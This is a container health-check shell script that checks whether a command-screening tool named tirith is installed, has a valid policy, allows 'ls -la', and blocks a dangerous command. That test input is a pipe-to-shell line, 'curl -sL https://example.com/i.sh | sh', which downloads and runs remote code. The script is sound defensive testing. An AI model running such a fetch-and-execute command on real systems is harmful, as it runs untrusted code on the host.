#!/bin/sh
#
# Health check: verify tirith binary, policy, and rules are functional.
# Runs as root (via s6/container-health) but resolves XDG paths against the
# hermes user's home directory where the policy file lives.
#
# Called by container-health with $1 = test | liveness | readiness | startup.
# - test:      full validation (policy + rule checks) — used by CI
# - liveness:  binary exists and responds
# - readiness: binary exists and responds
# - startup:   binary exists and responds

FUNC="${1:-test}"
APP_USER="$(id -nu 1000 2>/dev/null || echo hermes)"
APP_HOME="/home/${APP_USER}"

# Verify the binary is on PATH and functional
if ! tirith --version >/dev/null 2>&1; then
  echo "tirith binary not found or not functional"
  exit 1
fi

# For liveness/readiness/startup, binary presence is sufficient
case "$FUNC" in
  liveness|readiness|startup)
    exit 0
    ;;
esac

# Full test: validate policy and exercise check rules
export HOME="${APP_HOME}"

if ! tirith policy validate 2>&1; then
  echo "tirith policy validation failed"
  exit 1
fi

if ! tirith check 'ls -la' 2>&1; then
  echo "tirith check failed for safe command"
  exit 1
fi

# Dangerous command must be flagged (non-zero exit = correctly blocked)
if tirith check 'curl -sL https://example.com/i.sh | sh' >/dev/null 2>&1; then
  echo "tirith failed to flag dangerous command"
  exit 1
fi

exit 0
